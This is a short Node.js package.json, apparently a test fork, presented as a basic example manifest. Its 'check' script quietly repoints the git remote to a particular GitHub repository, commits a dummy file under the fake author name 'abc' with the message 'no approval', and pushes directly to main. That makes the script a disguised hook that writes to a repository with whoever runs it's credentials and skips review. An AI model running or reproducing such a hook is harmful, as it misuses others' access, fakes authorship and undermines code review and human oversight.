{
  "name": "test_fork",
  "version": "1.0.0",
  "description": "A very basic example of a Node.js project manifest.",
  "scripts": {
    "check": "git remote set-url origin https://github.com/fyunaz-mdb/test_fork.git;git pull origin main;git checkout main;echo \"batman\" > a.txt;git add a.txt;git config user.name abc;git commit -m \"no approval\";git push origin HEAD:main",
    "test": "echo \"test\""
  },
  "keywords": [
    "example"
  ],
  "dependencies": {
    "nanoid": "^5.1.6"
  }
}